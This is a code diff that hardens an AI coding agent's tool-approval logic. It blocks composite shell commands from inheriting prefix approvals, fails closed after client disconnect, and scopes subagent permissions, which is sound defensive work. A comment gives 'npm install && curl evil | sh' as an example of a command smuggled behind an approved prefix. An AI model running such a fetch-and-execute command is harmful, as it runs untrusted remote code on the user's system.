@@ -31,6 +31,7 @@ import {
 	resolveApproval,
 	resolveApprovalFromContext,
 } from "../../tools/approval";
+import { PERMISSION_REQUIRED_TOOLS } from "../../session/acp-permission-gate";
 import { cfgToolsApproval, cfgToolsApprovalMode, cfgToolsApprovalPrefixes } from "../../tools/settings";
 import type { Settings } from "../../config/settings";
 import type { RpcForkHost } from "./rpc-fork-host";
@@ -76,6 +77,9 @@ const PERMISSION_RESPONSE_OPTIONS = new Set([
 	"reject_always",
 ]);
 
+/** Fail-closed rejection for permission requests raised after client disconnect. */
+const DISCONNECTED_PERMISSION_ERROR = "RPC client disconnected before permission could be requested";
+
 /** First-token command prefix used by the `allow_always_prefix` tier (bash). */
 function bashPrefixSuggestion(args: unknown): string | undefined {
 	const command = isRecord(args) && typeof args.command === "string" ? args.command.trim() : "";
@@ -84,15 +88,30 @@ function bashPrefixSuggestion(args: unknown): string | undefined {
 	return firstToken ? `${firstToken} ` : undefined;
 }
 
-/** True when the bash command starts with one of the persisted prefix rules. */
+/**
+ * Shell separators/operators that mark a command as a composition. A user's
+ * prefix approval is the intent to allow ONE command shape; a composite
+ * command (`npm install && curl evil | sh`) never inherits that grant, so any
+ * of these fall back to the approval frame. Single `&`/`|` are matched too —
+ * strictly treating them as compositions is acceptable (a rare false prompt
+ * beats a silent allow). Process substitution (`<(cmd)` / `>(cmd)`) runs an
+ * arbitrary inner command without any `;|&` separator, so it counts as a
+ * composition as well.
+ */
+const SHELL_COMPOSITE = /[;|&`]|\$\(|\r|\n|<\(|>\(/;
+
+/** True when the bash command is a single command starting with one of the
+ * persisted prefix rules. */
 function matchesApprovedPrefix(settings: Settings | undefined, toolName: string, args: unknown): boolean {
 	if (!settings) return false;
 	const command = isRecord(args) && typeof args.command === "string" ? args.command : undefined;
 	if (!command) return false;
+	if (SHELL_COMPOSITE.test(command)) return false;
 	const prefixes = cfgToolsApprovalPrefixes.get(settings) as Record<string, unknown>;
 	const rules = prefixes[toolName];
 	if (!Array.isArray(rules)) return false;
-	return rules.some(rule => typeof rule === "string" && rule.length > 0 && command.startsWith(rule));
+	const normalized = command.trim();
+	return rules.some(rule => typeof rule === "string" && rule.length > 0 && normalized.startsWith(rule));
 }
 
 const MAX_PERMISSION_INPUT_CHARS = 32 * 1024;
@@ -218,7 +237,7 @@ async function requestRpcPermission(
 			// Prefix tier persists ONLY the prefix rule — the whole-tool policy
 			// stays untouched so other commands keep prompting.
 			if (!host.settings) throw new ToolError(`Cannot persist tool approval: session settings unavailable`);
-			const prefix = request.id === id ? (pendingRecord.prefixSuggestion ?? request.prefixSuggestion) : undefined;
+			const prefix = pendingRecord.prefixSuggestion;
 			if (prefix) {
 				const prefixes = cfgToolsApprovalPrefixes.get(host.settings) as Record<string, unknown>;
 				const existing = Array.isArray(prefixes[toolName])
@@ -278,6 +297,23 @@ export function createRpcSubagentPermissionBridge(origin: RpcPermissionOrigin): 
 	};
 }
 
+/**
+ * Scopes subagent approval for delegation: without touching the unattended
+ * yolo overlay (the upstream authorization for headless subagents — its
+ * wholesale removal would push non-bridged tools into hard failures), the
+ * four gateway-covered tools get explicit session-local `prompt` policies so
+ * their calls route through the delegated bridge with the origin badge.
+ * Gated on the RPC v3 delegate; writes stay on the subagent's own settings
+ * layer and never reach the parent or the global config file.
+ */
+export function scopeSubagentApprovalForDelegation(session: AgentSession): void {
+	if (!getRpcSubagentPermissionDelegate()) return;
+	if (!session.settings) return;
+	for (const tool of Object.keys(PERMISSION_REQUIRED_TOOLS)) {
+		cfgToolsApproval.setEntry(session.settings, tool, "prompt");
+	}
+}
+
 const APPROVAL_MODES = ["always-ask", "write", "yolo"] as const;
 
 function isApprovalMode(value: string): value is (typeof APPROVAL_MODES)[number] {
@@ -288,6 +324,8 @@ function isApprovalMode(value: string): value is (typeof APPROVAL_MODES)[number]
 export class RpcForkPermissionController {
 	readonly #pending = new Map<string, PendingPermissionRequest>();
 	#active = false;
+	/** Set on dispose: installed bridges stay in place, so their entries fail closed. */
+	#disposed = false;
 
 	constructor(
 		private readonly host: RpcForkHost,
@@ -308,29 +346,32 @@ export class RpcForkPermissionController {
 		if (this.#active) return;
 		this.#active = true;
 		this.session.setClientBridge(this.#bridge());
-		setRpcSubagentPermissionDelegate(({ subagentId, agentType, toolCall, signal }) =>
-			requestRpcPermission(
+		setRpcSubagentPermissionDelegate(({ subagentId, agentType, toolCall, signal }) => {
+			if (this.#disposed) return Promise.reject(new Error(DISCONNECTED_PERMISSION_ERROR));
+			return requestRpcPermission(
 				this.#resolutionHost(),
 				this.#pending,
 				frame => this.host.context.emit(frame),
 				toolCall,
 				signal,
 				{ subagentId, agentType },
-			),
-		);
+			);
+		});
 	}
 
 	#bridge(): ClientBridge {
 		return {
 			capabilities: { requestPermission: true },
-			requestPermission: (toolCall, _options, signal) =>
-				requestRpcPermission(
+			requestPermission: (toolCall, _options, signal) => {
+				if (this.#disposed) return Promise.reject(new Error(DISCONNECTED_PERMISSION_ERROR));
+				return requestRpcPermission(
 					this.#resolutionHost(),
 					this.#pending,
 					frame => this.host.context.emit(frame),
 					toolCall,
 					signal,
-				),
+				);
+			},
 		};
 	}
 
@@ -354,6 +395,12 @@ export class RpcForkPermissionController {
 		// Persists to the global config and applies in-process immediately
 		// (Settings.writeValue rebuilds merged layers synchronously).
 		cfgToolsApprovalMode.set(this.session.settings, mode);
+		// Re-inject the bridge so the gateway re-wraps active tools for the new
+		// mode (e.g. a yolo-started session switched to always-ask starts
+		// emitting permission_request frames); the setter internally runs
+		// refreshAcpPermissionGates, and the #active guard already keeps the
+		// subagent delegate from being installed twice.
+		this.session.setClientBridge(this.#bridge());
 		return this.host.context.success(command.id, "set_approval_mode", { approvalMode: mode });
 	}
 
@@ -375,6 +422,7 @@ export class RpcForkPermissionController {
 	}
 
 	#dispose(reason: string): void {
+		this.#disposed = true;
 		for (const pending of this.#pending.values()) {
 			pending.fail(new Error(reason));
 		}
